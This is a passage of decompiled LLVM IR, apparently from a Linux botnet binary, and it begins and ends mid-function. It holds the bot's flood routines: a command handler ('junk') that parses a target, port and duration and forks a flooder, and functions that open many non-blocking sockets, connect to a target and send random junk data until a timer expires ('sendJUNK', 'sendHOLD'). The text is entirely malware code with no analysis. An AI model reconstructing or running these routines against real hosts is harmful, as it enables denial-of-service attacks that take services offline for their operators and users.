  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  br i1 %v1_8050fbd, label %dec_label_pc_8050fe6, label %dec_label_pc_8050fc1

dec_label_pc_8050fc1:                             ; preds = %dec_label_pc_8050f86
  %v5_8050fc7 = load i32, i32* %v4_8050f23, align 8
  store i32 %v5_8050fc7, i32* %eax.global-to-local, align 4
  %v2_8050fcd = add i32 %v0_8050fb4, 16
  %v3_8050fcd = inttoptr i32 %v2_8050fcd to i32*
  store i32 %v5_8050fc7, i32* %v3_8050fcd, align 4
  %v0_8050fce = load i32, i32* %stack_var_-204, align 4
  %v1_8050fce = call i32 @close(i32 %v0_8050fce)
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_8050e23, align 4
  br label %dec_label_pc_8051097

dec_label_pc_8050fe6:                             ; preds = %dec_label_pc_8050f86
  store i8 2, i8* %v5_8050e23, align 4
  br label %dec_label_pc_8051097

dec_label_pc_8050ff6:                             ; preds = %dec_label_pc_8050f04
  %v13_8050ff6 = icmp eq i32 %v5_8050f75, -1
  %v1_8050ffa = icmp eq i1 %v13_8050ff6, false
  br i1 %v1_8050ffa, label %dec_label_pc_8051097, label %dec_label_pc_8051000

dec_label_pc_8051000:                             ; preds = %dec_label_pc_8050ff6
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_8051006 = load i32, i32* %v4_8050f23, align 8
  store i32 %v5_8051006, i32* %eax.global-to-local, align 4
  %v2_805100c = add i32 %v0_8050f7a, 16
  %v3_805100c = inttoptr i32 %v2_805100c to i32*
  store i32 %v5_8051006, i32* %v3_805100c, align 4
  %v1_805100d = call i32 @close(i32 %v5_8050f75)
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_8050e23, align 4
  br label %dec_label_pc_8051097

dec_label_pc_8051022:                             ; preds = %dec_label_pc_8050e41
  %v0_8051022 = load i32, i32* @esp, align 4
  %v1_8051025 = add i32 %v0_8051022, -12
  %v2_8051025 = inttoptr i32 %v1_8051025 to i32*
  store i32 1024, i32* %v2_8051025, align 4
  %v1_805102a = add i32 %v0_8051022, -16
  %v2_805102a = inttoptr i32 %v1_805102a to i32*
  store i32 32, i32* %v2_805102a, align 4
  %v2_805102c = call i32 @realrand(i32 %v7_8050e23, i32 %v12_8050d03)
  store i32 %v2_805102c, i32* %eax.global-to-local, align 4
  %v0_8051031 = load i32, i32* @esp, align 4
  %v5_805103a = add i32 %v0_8051031, 4
  %v6_805103a = inttoptr i32 %v5_805103a to i32*
  store i32 %v2_805102c, i32* %v6_805103a, align 4
  %v6_805103d = inttoptr i32 %v0_8051031 to i32*
  store i32 %v1_8050dd2, i32* %v6_805103d, align 4
  %v1_8051040 = inttoptr i32 %v2_805102c to i8*
  %v2_8051040 = call i32 @makeRandomShit(i8* %v1_8051040)
  %v0_8051045 = load i32, i32* @esp, align 4
  store i32 %v2_805102c, i32* @ecx, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v3_8051051 = add i32 %v2_8050e23, %v2_8050d99
  %v4_8051051 = inttoptr i32 %v3_8051051 to i32*
  %v5_8051051 = load i32, i32* %v4_8051051, align 8
  store i32 %v5_8051051, i32* %eax.global-to-local, align 4
  %v1_8051054 = add i32 %v0_8051045, 12
  %v2_8051054 = inttoptr i32 %v1_8051054 to i32*
  store i32 16384, i32* %v2_8051054, align 4
  %v0_8051059 = load i32, i32* @ecx, align 4
  %v2_8051059 = add i32 %v0_8051045, 8
  %v3_8051059 = inttoptr i32 %v2_8051059 to i32*
  store i32 %v0_8051059, i32* %v3_8051059, align 4
  %v5_805105a = add i32 %v0_8051045, 4
  %v6_805105a = inttoptr i32 %v5_805105a to i32*
  store i32 %v1_8050dd2, i32* %v6_805105a, align 4
  %v0_805105d = load i32, i32* %eax.global-to-local, align 4
  %v3_805105d = inttoptr i32 %v0_8051045 to i32*
  store i32 %v0_805105d, i32* %v3_805105d, align 4
  %v4_805105e = call i32 @send(i32 %v2_805102c, i32 %v5_8050e06, i32 %stack_var_-20.145, i32 %stack_var_-16.144)
  store i32 %v4_805105e, i32* %eax.global-to-local, align 4
  %v10_8051066 = icmp eq i32 %v4_805105e, -1
  %v1_8051069 = icmp eq i1 %v10_8051066, false
  br i1 %v1_8051069, label %dec_label_pc_8051097, label %dec_label_pc_805106b

dec_label_pc_805106b:                             ; preds = %dec_label_pc_8051022
  %v1_805106b = call i32 @__errno_location(i32 %v2_805102c)
  store i32 %v1_805106b, i32* %eax.global-to-local, align 4
  %v1_8051070 = inttoptr i32 %v1_805106b to i32*
  %v2_8051070 = load i32, i32* %v1_8051070, align 4
  store i32 %v2_8051070, i32* %eax.global-to-local, align 4
  %v9_8051072 = icmp eq i32 %v2_8051070, 11
  br i1 %v9_8051072, label %dec_label_pc_8051097, label %dec_label_pc_8051077

dec_label_pc_8051077:                             ; preds = %dec_label_pc_805106b
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_805107d = load i32, i32* %v4_8051051, align 8
  store i32 %v5_805107d, i32* %eax.global-to-local, align 4
  %v0_8051080 = load i32, i32* @esp, align 4
  %v2_8051083 = add i32 %v0_8051080, -16
  %v3_8051083 = inttoptr i32 %v2_8051083 to i32*
  store i32 %v5_805107d, i32* %v3_8051083, align 4
  %v1_8051084 = call i32 @close(i32 %v2_805102c)
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_8050e23, align 4
  br label %dec_label_pc_8051097

dec_label_pc_8051097:                             ; preds = %dec_label_pc_8050e4e, %dec_label_pc_805106b, %dec_label_pc_8051022, %dec_label_pc_8050ff6, %dec_label_pc_8051000, %dec_label_pc_8050fe6, %dec_label_pc_8050fc1, %dec_label_pc_8050ef4, %dec_label_pc_8050eda, %dec_label_pc_8051077
  %stack_var_-16.0 = phi i32 [ %v2_8050f0e, %dec_label_pc_8050ff6 ], [ %v2_8050f0e, %dec_label_pc_8051000 ], [ %v2_8050f0e, %dec_label_pc_8050fe6 ], [ %v2_8050f0e, %dec_label_pc_8050fc1 ], [ %stack_var_-16.144, %dec_label_pc_8051022 ], [ %stack_var_-16.144, %dec_label_pc_805106b ], [ %stack_var_-16.144, %dec_label_pc_8051077 ], [ %stack_var_-16.144, %dec_label_pc_8050eda ], [ %stack_var_-16.144, %dec_label_pc_8050ef4 ], [ %stack_var_-16.144, %dec_label_pc_8050e4e ]
  %stack_var_-20.0 = phi i32 [ %v6_8050f15, %dec_label_pc_8050ff6 ], [ %v6_8050f15, %dec_label_pc_8051000 ], [ %v6_8050f15, %dec_label_pc_8050fe6 ], [ %v6_8050f15, %dec_label_pc_8050fc1 ], [ %stack_var_-20.145, %dec_label_pc_8051022 ], [ %stack_var_-20.145, %dec_label_pc_805106b ], [ %stack_var_-20.145, %dec_label_pc_8051077 ], [ %stack_var_-20.145, %dec_label_pc_8050eda ], [ %stack_var_-20.145, %dec_label_pc_8050ef4 ], [ %stack_var_-20.145, %dec_label_pc_8050e4e ]
  %v4_8051097 = add nuw nsw i32 %storemerge46, 1
  store i32 %v4_8051097, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8051097, %v2_8050d1f
  br i1 %exitcond, label %dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge, label %dec_label_pc_8050e1d

dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge: ; preds = %dec_label_pc_8051097
  %v0_80510a6.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80510a6

dec_label_pc_80510a6:                             ; preds = %dec_label_pc_805109a.preheader, %dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge, %dec_label_pc_8050d60
  %v0_80510a6 = phi i32 [ %v1_8050e03, %dec_label_pc_8050d60 ], [ %v0_80510a6.pre.pre, %dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge ], [ %v1_80510b0, %dec_label_pc_805109a.preheader ]
  %stack_var_-16.2 = phi i32 [ %tmp5, %dec_label_pc_8050d60 ], [ %stack_var_-16.0, %dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge ], [ %stack_var_-16.2, %dec_label_pc_805109a.preheader ]
  %stack_var_-20.2 = phi i32 [ %tmp6, %dec_label_pc_8050d60 ], [ %stack_var_-20.0, %dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge ], [ %stack_var_-20.2, %dec_label_pc_805109a.preheader ]
  %stack_var_-40.0 = phi i32 [ %tmp8, %dec_label_pc_8050d60 ], [ %v2_8050d1f, %dec_label_pc_805109a.dec_label_pc_80510a6.loopexit_crit_edge ], [ 0, %dec_label_pc_805109a.preheader ]
  %v1_80510a9 = add i32 %v0_80510a6, -16
  %v2_80510a9 = inttoptr i32 %v1_80510a9 to i32*
  store i32 0, i32* %v2_80510a9, align 4
  %v1_80510ab = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_80510ab = call i32 @__GI_time(i32* %v1_80510ab)
  store i32 %v2_80510ab, i32* %eax.global-to-local, align 4
  %v5_80510b6 = icmp slt i32 %v2_80510ab, %v5_8050e06
  br i1 %v5_80510b6, label %dec_label_pc_805109a.preheader, label %dec_label_pc_80510bc

dec_label_pc_805109a.preheader:                   ; preds = %dec_label_pc_80510a6
  %v0_80510b0 = load i32, i32* @esp, align 4
  %v1_80510b0 = add i32 %v0_80510b0, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_80510a043, label %dec_label_pc_8050e1d, label %dec_label_pc_80510a6

dec_label_pc_80510bc:                             ; preds = %dec_label_pc_80510a6, %entry
  %v0_80510c8 = phi i32 [ %v3_8050d4f, %entry ], [ %v2_80510ab, %dec_label_pc_80510a6 ]
  ret i32 %v0_80510c8

; uselistorder directives
  uselistorder i32 %v4_8051097, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v0_8051045, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8050f7a, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_8050f75, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050f34, { 1, 0 }
  uselistorder i32* %v4_8050f23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v12_8050e93, { 1, 0 }
  uselistorder i32 %v0_8050e8e, { 2, 0, 1 }
  uselistorder i32 %v7_8050e23, { 7, 2, 1, 3, 4, 5, 6, 8, 0 }
  uselistorder i8* %v5_8050e23, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-16.144, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-20.145, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge46, { 5, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 19, 18, 17, 16, 15, 14, 20, 0, 1 }
  uselistorder i32 %v5_8050e06, { 1, 0, 2 }
  uselistorder i32 %v2_8050db6, { 1, 0 }
  uselistorder i32 %v2_8050d99, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 5, 4 }
  uselistorder i32 %v2_8050d88, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050d2d, { 1, 0 }
  uselistorder i32 %v2_8050d1f, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8050d11, { 1, 0, 2 }
  uselistorder i32 %v12_8050d03, { 5, 1, 2, 3, 4, 6, 0, 7, 8 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0, 2 }
  uselistorder i32* %stack_var_-204, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 55, 44, 43, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder label %dec_label_pc_8051097, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @junk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_80510d4 = icmp sgt i32 %arg3, 2
  br i1 %v7_80510d4, label %dec_label_pc_80510d6, label %entry.dec_label_pc_80510ee_crit_edge

entry.dec_label_pc_80510ee_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80510ee

dec_label_pc_80510d6:                             ; preds = %entry
  %v1_80510d9 = add i32 %arg4, 12
  %v1_80510dc = inttoptr i32 %v1_80510d9 to i32*
  %v2_80510dc = load i32, i32* %v1_80510dc, align 4
  %v1_80510e2 = call i32 @atol(i32 %v2_80510dc)
  store i32 %v1_80510e2, i32* @eax, align 4
  %v2_80510ea = icmp slt i32 %v1_80510e2, 0
  %v1_80510ec = icmp eq i1 %v2_80510ea, false
  br i1 %v1_80510ec, label %dec_label_pc_8051106, label %dec_label_pc_80510ee

dec_label_pc_80510ee:                             ; preds = %entry.dec_label_pc_80510ee_crit_edge, %dec_label_pc_80510d6
  %v3_80510fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806a304.300 to i32))
  br label %dec_label_pc_8051182

dec_label_pc_8051106:                             ; preds = %dec_label_pc_80510d6
  %v1_805110c = call i32 @mfork(i32 %arg2)
  %v1_8051114 = icmp eq i32 %v1_805110c, 0
  %v1_8051116 = icmp eq i1 %v1_8051114, false
  br i1 %v1_8051116, label %dec_label_pc_8051182, label %dec_label_pc_8051118

dec_label_pc_8051118:                             ; preds = %dec_label_pc_8051106
  %v1_805111b = add i32 %arg4, 8
  %v1_805111e = inttoptr i32 %v1_805111b to i32*
  %v1_8051123 = add i32 %arg4, 4
  %v1_8051126 = inttoptr i32 %v1_8051123 to i32*
  %v3_8051138 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806a328.301 to i32))
  %v2_8051146 = load i32, i32* %v1_80510dc, align 4
  %v1_805114c = call i32 @atol(i32 %v2_8051146)
  store i32 %v1_805114c, i32* @ebx, align 4
  %v2_805115c = load i32, i32* %v1_805111e, align 4
  %v1_8051162 = call i32 @atol(i32 %v2_805115c)
  %v2_8051172 = load i32, i32* %v1_8051126, align 4
  %v0_8051177 = load i32, i32* @ebx, align 4
  %v4_805117a = call i32 @sendJUNK(i32 %v2_8051172, i32 %v1_8051162, i32 %v0_8051177)
  br label %dec_label_pc_8051182

dec_label_pc_8051182:                             ; preds = %dec_label_pc_8051106, %dec_label_pc_80510ee, %dec_label_pc_8051118
  %v0_8051186 = phi i32 [ %v1_805110c, %dec_label_pc_8051106 ], [ %v3_80510fc, %dec_label_pc_80510ee ], [ %v4_805117a, %dec_label_pc_8051118 ]
  ret i32 %v0_8051186

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051182, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80510ee, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v12_805118c = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_805118c, i32* %eax.global-to-local, align 4
  %v1_805119a = call i32 @getdtablesize(i32 %v12_805118c)
  store i32 %v1_805119a, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_805119a, 0
  %v2_80511a3 = zext i1 %tmp to i32
  %v2_80511a6 = add i32 %v2_80511a3, %v1_805119a
  %v2_80511a8 = sdiv i32 %v2_80511a6, 2
  store i32 2, i32* %stack_var_-64, align 4
  %v1_80511b6 = urem i32 %arg2, 65536
  store i32 %v1_80511b6, i32* %eax.global-to-local, align 4
  %v1_80511bf = call i32 @htons(i32 %v1_80511b6)
  %v2_80511ce = ptrtoint i32* %stack_var_-64 to i32
  %v15_80511d1 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_80511d1, i32* %eax.global-to-local, align 4
  %v3_80511d8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_80511d8, i32* %eax.global-to-local, align 4
  %v1_80511e0 = icmp eq i32 %v3_80511d8, 0
  br i1 %v1_80511e0, label %dec_label_pc_80511e9, label %dec_label_pc_8051546

dec_label_pc_80511e9:                             ; preds = %entry
  %v15_80511f3 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_80511f3, i32* %eax.global-to-local, align 4
  %v3_80511f7 = bitcast i32* %stack_var_-56 to i8*
  %v4_80511f7 = call i32 @__GI_memset(i8* %v3_80511f7, i32 0, i32 8)
  %v2_8051202 = mul i32 %v2_80511a8, 8
  %v1_8051208 = add i32 %v2_8051202, 30
  %v2_805120b = and i32 %v1_8051208, -16
  %v2_8051211 = sub i32 %v12_805118c, %v2_805120b
  %v1_805121f = add i32 %v2_8051211, 15
  %v2_8051222 = and i32 %v1_805121f, -16
  %v2_805123f = mul i32 %v2_80511a8, 5
  store i32 %v2_805123f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051222, i32* %edx.global-to-local, align 4
  %v2_8051247 = add i32 %v2_8051211, -8
  %v3_8051247 = inttoptr i32 %v2_8051247 to i32*
  store i32 %v2_805123f, i32* %v3_8051247, align 4
  %v1_8051248 = add i32 %v2_8051211, -12
  %v2_8051248 = inttoptr i32 %v1_8051248 to i32*
  store i32 0, i32* %v2_8051248, align 4
  %v0_805124a = load i32, i32* %edx.global-to-local, align 4
  %v2_805124a = add i32 %v2_8051211, -16
  %v3_805124a = inttoptr i32 %v2_805124a to i32*
  store i32 %v0_805124a, i32* %v3_805124a, align 4
  %v3_805124b = inttoptr i32 %v2_8051222 to i8*
  %v4_805124b = call i32 @__GI_memset(i8* %v3_805124b, i32 %tmp9, i32 %v12_805118c)
  store i32 %v4_805124b, i32* %eax.global-to-local, align 4
  %v0_8051250 = load i32, i32* @esp, align 4
  %v2_8051256 = inttoptr i32 %v0_8051250 to i32*
  store i32 0, i32* %v2_8051256, align 4
  %v1_8051258 = inttoptr i32 %v2_8051222 to i32*
  %v2_8051258 = call i32 @__GI_time(i32* %v1_8051258)
  %v0_805125d = load i32, i32* @esp, align 4
  %v1_805125d = add i32 %v0_805125d, 16
  %v5_8051260 = add i32 %v2_8051258, %arg3
  store i32 %v5_8051260, i32* %eax.global-to-local, align 4
  %v3_805127d = or i32 %v2_8051222, 4
  %v2_8051368 = ptrtoint i32* %stack_var_-192 to i32
  %tmp36 = bitcast i32* %stack_var_-192 to i8*
  %v2_80513bc = ptrtoint i32* %stack_var_-200 to i32
  %v2_80513f6 = ptrtoint i32* %stack_var_-204 to i32
  %v2_80513fd = ptrtoint i32* %stack_var_-208 to i32
  %v5_805152a43 = icmp sgt i32 %v2_80511a6, 1
  br label %dec_label_pc_8051530

dec_label_pc_8051277:                             ; preds = %dec_label_pc_8051524.preheader, %dec_label_pc_8051521
  %storemerge44 = phi i32 [ %v4_8051521, %dec_label_pc_8051521 ], [ 0, %dec_label_pc_8051524.preheader ]
  store i32 %storemerge44, i32* %eax.global-to-local, align 4
  store i32 %v2_8051222, i32* %edx.global-to-local, align 4
  %v2_805127d = mul i32 %storemerge44, 8
  %v4_805127d = add i32 %v2_805127d, %v3_805127d
  %v5_805127d = inttoptr i32 %v4_805127d to i8*
  %v6_805127d = load i8, i8* %v5_805127d, align 4
  %v7_805127d = zext i8 %v6_805127d to i32
  %v9_805127d = and i32 %storemerge44, -256
  %v10_805127d = or i32 %v7_805127d, %v9_805127d
  store i32 %v10_805127d, i32* %eax.global-to-local, align 4
  store i32 %v7_805127d, i32* %edx.global-to-local, align 4
  %v8_805128e = icmp eq i8 %v6_805127d, 0
  %v12_805128e = icmp eq i8 %v6_805127d, 1
  br i1 %v12_805128e, label %dec_label_pc_805135e, label %dec_label_pc_805129b

dec_label_pc_805129b:                             ; preds = %dec_label_pc_8051277
  %v12_805129b = icmp eq i8 %v6_805127d, 2
  br i1 %v12_805129b, label %dec_label_pc_805147f, label %dec_label_pc_80512a8

dec_label_pc_80512a8:                             ; preds = %dec_label_pc_805129b
  br i1 %v8_805128e, label %dec_label_pc_80512b6, label %dec_label_pc_8051521

dec_label_pc_80512b6:                             ; preds = %dec_label_pc_80512a8
  store i32 %storemerge44, i32* @ebx, align 4
  %v0_80512b9 = load i32, i32* @esp, align 4
  %v1_80512bc = add i32 %v0_80512b9, -8
  %v2_80512bc = inttoptr i32 %v1_80512bc to i32*
  store i32 0, i32* %v2_80512bc, align 4
  %v1_80512be = add i32 %v0_80512b9, -12
  %v2_80512be = inttoptr i32 %v1_80512be to i32*
  store i32 1, i32* %v2_80512be, align 4
  %v1_80512c0 = add i32 %v0_80512b9, -16
  %v2_80512c0 = inttoptr i32 %v1_80512c0 to i32*
  store i32 2, i32* %v2_80512c0, align 4
  %v3_80512c2 = call i32 @socket(i32 %v7_805127d, i32 %v12_805118c, i32 ptrtoint (i32* @0 to i32))
  %v2_80512cf = load i32, i32* @ebx, align 4
  %v3_80512cf = mul i32 %v2_80512cf, 8
  %v4_80512cf = add i32 %v3_80512cf, %v2_8051222
  %v5_80512cf = inttoptr i32 %v4_80512cf to i32*
  store i32 %v3_80512c2, i32* %v5_80512cf, align 8
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v3_80512d8 = add i32 %v2_805127d, %v2_8051222
  %v4_80512d8 = inttoptr i32 %v3_80512d8 to i32*
  %v5_80512d8 = load i32, i32* %v4_80512d8, align 8
  store i32 %v5_80512d8, i32* %eax.global-to-local, align 4
  %v0_80512db = load i32, i32* @esp, align 4
  %v1_80512de = add i32 %v0_80512db, -8
  %v2_80512de = inttoptr i32 %v1_80512de to i32*
  store i32 0, i32* %v2_80512de, align 4
  %v1_80512e0 = add i32 %v0_80512db, -12
  %v2_80512e0 = inttoptr i32 %v1_80512e0 to i32*
  store i32 3, i32* %v2_80512e0, align 4
  %v0_80512e2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80512e2 = add i32 %v0_80512db, -16
  %v3_80512e2 = inttoptr i32 %v2_80512e2 to i32*
  store i32 %v0_80512e2, i32* %v3_80512e2, align 4
  %v3_80512e3 = call i32 @fcntl(i32 %v7_805127d, i32 %v12_805118c, i32 ptrtoint (i32* @0 to i32))
  %v0_80512e8 = load i32, i32* @esp, align 4
  %v12_80512ed = or i32 %v3_80512e3, 2048
  store i32 %v12_80512ed, i32* @ecx, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_80512f6 = load i32, i32* %v4_80512d8, align 8
  store i32 %v5_80512f6, i32* %eax.global-to-local, align 4
  %v2_80512fc = add i32 %v0_80512e8, 8
  %v3_80512fc = inttoptr i32 %v2_80512fc to i32*
  store i32 %v12_80512ed, i32* %v3_80512fc, align 4
  %v1_80512fd = add i32 %v0_80512e8, 4
  %v2_80512fd = inttoptr i32 %v1_80512fd to i32*
  store i32 4, i32* %v2_80512fd, align 4
  %v0_80512ff = load i32, i32* %eax.global-to-local, align 4
  %v3_80512ff = inttoptr i32 %v0_80512e8 to i32*
  store i32 %v0_80512ff, i32* %v3_80512ff, align 4
  %v3_8051300 = call i32 @fcntl(i32 %v7_805127d, i32 %v12_805118c, i32 ptrtoint (i32* @0 to i32))
  %v0_8051305 = load i32, i32* @esp, align 4
  store i32 %v2_80511ce, i32* @ecx, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_8051311 = load i32, i32* %v4_80512d8, align 8
  store i32 %v5_8051311, i32* %eax.global-to-local, align 4
  %v1_8051317 = add i32 %v0_8051305, 8
  %v2_8051317 = inttoptr i32 %v1_8051317 to i32*
  store i32 16, i32* %v2_8051317, align 4
  %v2_8051319 = add i32 %v0_8051305, 4
  %v3_8051319 = inttoptr i32 %v2_8051319 to i32*
  store i32 %v2_80511ce, i32* %v3_8051319, align 4
  %v0_805131a = load i32, i32* %eax.global-to-local, align 4
  %v3_805131a = inttoptr i32 %v0_8051305 to i32*
  store i32 %v0_805131a, i32* %v3_805131a, align 4
  %v3_805131b = call i32 @connect(i32 %v7_805127d, i32 %v12_805118c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805131b, i32* %eax.global-to-local, align 4
  %v0_8051320 = load i32, i32* @esp, align 4
  %v1_8051320 = add i32 %v0_8051320, 16
  %v10_8051323 = icmp eq i32 %v3_805131b, -1
  %v1_8051326 = icmp eq i1 %v10_8051323, false
  br i1 %v1_8051326, label %dec_label_pc_8051334, label %dec_label_pc_8051328

dec_label_pc_8051328:                             ; preds = %dec_label_pc_80512b6
  %v1_8051328 = call i32 @__errno_location(i32 %v7_805127d)
  store i32 %v1_8051328, i32* %eax.global-to-local, align 4
  %v1_805132d = inttoptr i32 %v1_8051328 to i32*
  %v2_805132d = load i32, i32* %v1_805132d, align 4
  store i32 %v2_805132d, i32* %eax.global-to-local, align 4
  %v9_805132f = icmp eq i32 %v2_805132d, 115
  br i1 %v9_805132f, label %dec_label_pc_805134e, label %dec_label_pc_8051328.dec_label_pc_8051334_crit_edge

dec_label_pc_8051328.dec_label_pc_8051334_crit_edge: ; preds = %dec_label_pc_8051328
  %v0_805133d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051334

dec_label_pc_8051334:                             ; preds = %dec_label_pc_8051328.dec_label_pc_8051334_crit_edge, %dec_label_pc_80512b6
  %v0_805133d = phi i32 [ %v0_805133d.pre, %dec_label_pc_8051328.dec_label_pc_8051334_crit_edge ], [ %v1_8051320, %dec_label_pc_80512b6 ]
  store i32 %storemerge44, i32* %eax.global-to-local, align 4
  store i32 %v2_8051222, i32* %edx.global-to-local, align 4
  %v5_805133a = load i32, i32* %v4_80512d8, align 8
  store i32 %v5_805133a, i32* %eax.global-to-local, align 4
  %v2_8051340 = add i32 %v0_805133d, -16
  %v3_8051340 = inttoptr i32 %v2_8051340 to i32*
  store i32 %v5_805133a, i32* %v3_8051340, align 4
  %v1_8051341 = call i32 @close(i32 %v7_805127d)
  store i32 %v1_8051341, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051521

dec_label_pc_805134e:                             ; preds = %dec_label_pc_8051328
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_805127d, align 4
  br label %dec_label_pc_8051521

dec_label_pc_805135e:                             ; preds = %dec_label_pc_8051277
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8051368, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805136f = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v3_805137d = add i32 %v2_805127d, %v2_8051222
  %v4_805137d = inttoptr i32 %v3_805137d to i32*
  %v5_805137d = load i32, i32* %v4_805137d, align 8
  %v2_8051382 = udiv i32 %v5_805137d, 32
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_805138b = load i32, i32* %v4_805137d, align 8
  %v1_805138e = urem i32 %v5_805138b, 32
  store i32 %v1_805138e, i32* %eax.global-to-local, align 4
  %v0_8051391 = load i32, i32* @ebp, align 4
  %v2_8051391 = mul nuw nsw i32 %v2_8051382, 4
  %v3_8051391 = add nsw i32 %v2_8051391, -188
  %v4_8051391 = add i32 %v3_8051391, %v0_8051391
  %v5_8051391 = inttoptr i32 %v4_8051391 to i32*
  %v6_8051391 = load i32, i32* %v5_8051391, align 4
  %v9_8051391 = shl i32 1, %v1_805138e
  %v12_8051391 = or i32 %v6_8051391, %v9_8051391
  store i32 %v12_8051391, i32* %v5_8051391, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8051222, i32* %eax.global-to-local, align 4
  %v5_80513b3 = load i32, i32* %v4_805137d, align 8
  %v1_80513b6 = add i32 %v5_80513b3, 1
  store i32 %v1_80513b6, i32* %edx.global-to-local, align 4
  %v0_80513b9 = load i32, i32* @esp, align 4
  %v2_80513c2 = add i32 %v0_80513b9, -16
  %v3_80513c2 = inttoptr i32 %v2_80513c2 to i32*
  store i32 %v2_80513bc, i32* %v3_80513c2, align 4
